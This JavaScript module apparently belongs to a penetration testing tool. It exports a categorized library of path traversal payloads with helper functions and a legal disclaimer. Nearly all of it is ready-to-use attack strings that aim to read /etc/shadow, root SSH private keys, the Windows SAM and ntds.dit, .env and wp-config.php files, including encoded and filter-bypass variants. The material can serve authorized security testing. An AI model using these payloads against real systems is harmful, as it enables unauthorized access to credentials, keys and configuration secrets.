// Path Traversal / Directory Traversal Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const pathTraversalPayloads = {
  unixBasic: {
    name: 'Unix/Linux Basic Traversal',
    description: 'Classic path traversal payloads for Unix/Linux systems targeting sensitive files',
    category: 'Unix Basic',
    payloads: [
      {
        name: '/etc/passwd (simple)',
        code: '../../../../etc/passwd'
      },
      {
        name: '/etc/passwd (deep)',
        code: '../../../../../../../../../../../etc/passwd'
      },
      {
        name: '/etc/shadow',
        code: '../../../../etc/shadow'
      },
      {
        name: '/etc/hosts',
        code: '../../../../etc/hosts'
      },
      {
        name: 'SSH private key (root)',
        code: '../../../../root/.ssh/id_rsa'
      },
      {
        name: 'Apache access log',
        code: '../../../../var/log/apache2/access.log'
      },
      {
        name: 'Nginx error log',
        code: '../../../../var/log/nginx/error.log'
      },
      {
        name: 'Bash history (root)',
        code: '../../../../root/.bash_history'
      }
    ]
  },
  windowsBasic: {
    name: 'Windows Basic Traversal',
    description: 'Classic path traversal payloads for Windows systems',
    category: 'Windows Basic',
    payloads: [
      {
        name: 'win.ini (forward slash)',
        code: '../../../../windows/win.ini'
      },
      {
        name: 'win.ini (backslash)',
        code: '..\\..\\..\\..\\windows\\win.ini'
      },
      {
        name: 'SAM file',
        code: '../../../../windows/system32/config/SAM'
      },
      {
        name: 'Boot.ini',
        code: '../../../../boot.ini'
      },
      {
        name: 'Hosts file',
        code: '../../../../windows/system32/drivers/etc/hosts'
      },
      {
        name: 'IIS metabase',
        code: '../../../../windows/system32/inetsrv/MetaBase.xml'
      },
      {
        name: 'web.config',
        code: '../../../../inetpub/wwwroot/web.config'
      },
      {
        name: 'NTDS.dit (AD database)',
        code: '../../../../windows/ntds/ntds.dit'
      }
    ]
  },
  encodedTraversal: {
    name: 'Encoded Traversal Sequences',
    description: 'URL/percent-encoded path traversal to bypass input validation',
    category: 'Encoded',
    payloads: [
      {
        name: 'URL-encoded dots',
        code: '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      },
      {
        name: 'Double URL-encoded',
        code: '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
      },
      {
        name: 'UTF-8 encoded slash',
        code: '..%c0%afetc%c0%afpasswd'
      },
      {
        name: 'Hex encoded backslash',
        code: '..%5c..%5cwindows%5cwin.ini'
      },
      {
        name: 'Unicode encoded dots',
        code: '\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd'
      },
      {
        name: 'Null byte append',
        code: '../../../../etc/passwd%00.jpg'
      },
      {
        name: 'Trailing slash bypass',
        code: '../../../../etc/passwd/'
      },
      {
        name: 'Mixed encoding',
        code: '..%2f..%2f..%2f..%2fetc%2fpasswd'
      }
    ]
  },
  bypassTechniques: {
    name: 'Filter Bypass Techniques',
    description: 'Techniques to bypass path traversal filters and sanitization',
    category: 'Bypass Techniques',
    payloads: [
      {
        name: 'Double dot bypass (..../)',
        code: '....//....//....//etc/passwd'
      },
      {
        name: 'Extra dots (..../',
        code: '..../..../..../etc/passwd'
      },
      {
        name: 'Mixed separators',
        code: '..\\/../..\\/../etc/passwd'
      },
      {
        name: 'Absolute path bypass',
        code: '/etc/passwd'
      },
      {
        name: 'Absolute path with null',
        code: '/etc/passwd%00'
      },
      {
        name: 'Repeated traversal',
        code: '/var/www/../../etc/passwd'
      },
      {
        name: 'Overlong UTF-8',
        code: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
      },
      {
        name: '16-bit Unicode encoding',
        code: '%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd'
      }
    ]
  },
  webConfigFiles: {
    name: 'Web Application Config Files',
    description: 'Path traversal to read web application configuration and sensitive files',
    category: 'Web Config Files',
    payloads: [
      {
        name: 'PHP config',
        code: '../../../../var/www/html/config.php'
      },
      {
        name: '.env file',
        code: '../../../../var/www/html/.env'
      },
      {
        name: 'WordPress config',
        code: '../../../../var/www/html/wp-config.php'
      },
      {
        name: 'Drupal settings',
        code: '../../../../var/www/html/sites/default/settings.php'
      },
      {
        name: 'Tomcat users',
        code: '../../../../tomcat/conf/tomcat-users.xml'
      },
      {
        name: 'Spring properties',
        code: '../../../../WEB-INF/classes/application.properties'
      },
      {
        name: 'WEB-INF/web.xml',
        code: '../../../../WEB-INF/web.xml'
      },
      {
        name: 'SSH authorized keys',
        code: '../../../../home/{USER}/.ssh/authorized_keys'
      }
    ]
  }
}

export const quickProbes = [
  '../../../../etc/passwd',
  '../../../../../../../../../../../etc/passwd',
  '..\\..\\..\\..\\windows\\win.ini',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '....//....//....//etc/passwd'
]

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(pathTraversalPayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(pathTraversalPayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

Path traversal attacks can be extremely dangerous and result in:
• Unauthorized access to sensitive files and credentials
• Exposure of application source code and configuration
• Reading of system files (/etc/passwd, /etc/shadow)
• Access to private keys and authentication credentials
• Complete server information disclosure

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized path traversal attacks are ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Significant fines

By using this tool, you acknowledge responsibility for your actions.
`
